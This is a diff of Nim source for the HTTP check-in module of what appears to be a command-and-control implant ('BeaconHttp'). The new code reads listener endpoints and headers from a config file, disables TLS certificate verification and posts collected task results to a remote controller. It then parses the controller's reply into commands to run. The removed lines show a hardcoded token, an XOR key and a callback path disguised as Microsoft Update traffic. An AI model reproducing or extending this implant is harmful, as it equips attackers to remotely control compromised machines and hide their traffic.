@@ -4,71 +4,121 @@ import json
 import uri
 import std/strutils
 import std/base64
+import std/tables
+import std/random
 
 import Beacon
 
 
-var Bearer = "Bearer dgfghlsfojdojsdgsghsfgdssfsdsqffgcd"
+type
+  BeaconHttp* = ref object of Beacon
+    host: string
+    port: string
+    scheme: string
+    endpoints: seq[string]
+    headers: Table[string, string]
+    isHttps: bool
+    configPath: string
 
 
-type 
-    BeaconHttp* = ref object of Beacon
-        url: string
-        port: string
+proc loadConfig(self: BeaconHttp, path: string) =
+  var configJson: JsonNode
+  try:
+    configJson = parseFile(path)
+  except CatchableError:
+    return
+
+  if configJson.hasKey("xorKey"):
+    self.xorKey = configJson["xorKey"].getStr()
+
+  let listenerKey = if self.isHttps: "ListenerHttpsConfig" else: "ListenerHttpConfig"
+  if not configJson.hasKey(listenerKey):
+    return
+
+  let listenerConfig = configJson[listenerKey]
+
+  if listenerConfig.hasKey("uri"):
+    let uriNode = listenerConfig["uri"]
+    if uriNode.kind == JArray:
+      self.endpoints.setLen(0)
+      for value in uriNode:
+        if value.kind == JString:
+          self.endpoints.add(value.getStr())
+
+  if listenerConfig.hasKey("client"):
+    let clientNode = listenerConfig["client"]
+    if clientNode.kind == JObject and clientNode.hasKey("headers"):
+      let headerNode = clientNode["headers"]
+      if headerNode.kind == JObject:
+        for k, v in headerNode.pairs:
+          if v.kind == JString:
+            self.headers[k] = v.getStr()
 
 
-proc initBeaconHttp*(self: BeaconHttp, url, port: string) =
-    self.initBeacon()
-    self.url = url
-    self.port = port
+proc initBeaconHttp*(self: BeaconHttp, baseUrl, port: string, configPath = "BeaconConfig.json") =
+  self.initBeacon()
+  self.port = port
+  self.configPath = configPath
+
+  let parsed = parseUri(baseUrl)
+  var scheme = parsed.scheme
+  if scheme.len == 0:
+    scheme = "http"
+  self.scheme = scheme.toLowerAscii()
+  self.isHttps = self.scheme == "https"
+  self.host = parsed.hostname
+  if self.host.len == 0:
+    self.host = baseUrl
+
+  self.endpoints = @[]
+  self.headers = initTable[string, string]()
+
+  self.loadConfig(configPath)
+
+  if self.endpoints.len == 0:
+    self.endpoints = @[parsed.path]
+  if self.endpoints.len == 0:
+    self.endpoints = @["/"]
 
 
-proc checkIn*(self: BeaconHttp) = 
-    let client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
+proc checkIn*(self: BeaconHttp) =
+  let client = newHttpClient(sslContext = newContext(verifyMode = CVerifyNone))
 
-    try:
-        client.headers = newHttpHeaders({ "Authorization": Bearer, "Content-Type": "application/json" })
+  try:
+    var clientHeaders = newHttpHeaders()
+    var hasHeaders = false
+    for k, v in self.headers.pairs:
+      clientHeaders[k] = v
+      hasHeaders = true
+    if not self.headers.hasKey("Content-Type"):
+      clientHeaders["Content-Type"] = "text/plain;charset=UTF-8"
+      hasHeaders = true
+    if hasHeaders:
+      client.headers = clientHeaders
 
-        # data to send
-        var sessions = newJArray()
-        for it in self.taskResults:
-            sessions.add(it)
+    let payload = self.taskResultsToCmd()
 
-        var nbTaskResults = len(self.taskResults)
-        for i in 0..nbTaskResults-1:
-            var tmp = self.taskResults.pop()
+    var endpoint = self.endpoints[rand(self.endpoints.high)]
+    if endpoint.len == 0:
+      endpoint = "/"
+    elif endpoint[0] != '/':
+      endpoint = "/" & endpoint
 
-        var boundel = %*{"arch": self.arch, "beaconHash": self.beaconHash, 
-                        "hostname": self.hostname , "listenerHash": "", "os": self.os, 
-                        "privilege": self.privilege, "sessions": "", "username": self.username, "lastProofOfLife":"0"}
+    let fullUrl = self.scheme & "://" & self.host & ":" & self.port & endpoint
 
-        boundel["sessions"]=sessions
+    let response = client.request(fullUrl, httpMethod = HttpPost, body = payload)
 
-        var multiBoundel = newJArray()
-        multiBoundel.add(boundel)
+    if response.code == Http200 and response.body.len > 0:
+      self.cmdToTasks(response.body)
 
-        var key="dfsdgferhzdzxczevre5595485sdg";
-        var datab64 = xorEncode(key, $multiBoundel)
-        var bodyToPost = encode(datab64)
+  except:
+    let
+      e = getCurrentException()
+      msg = getCurrentExceptionMsg()
+    echo "Inside checkIn, got exception ", repr(e), " with message ", msg
 
-        # data received
-        let response = client.request(self.url & ":" & self.port & "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", httpMethod = HttpPost, body = bodyToPost)
-
-        # cmdToTasks
-        var bodyb64d = decode(response.body)
-        var bodyb64dd = xorEncode(key, bodyb64d)
-        var cmdToProcess: string
-        cmdToProcess = toString(bodyb64dd)
-        self.cmdToTasks(cmdToProcess)
-
-    except:
-        let
-            e = getCurrentException()
-            msg = getCurrentExceptionMsg()
-        echo "Inside checkIn, got exception ", repr(e), " with message ", msg
-
-    finally:
-        close(client)
+  finally:
+    close(client)
 
 
 proc runTasks*(self: BeaconHttp) =
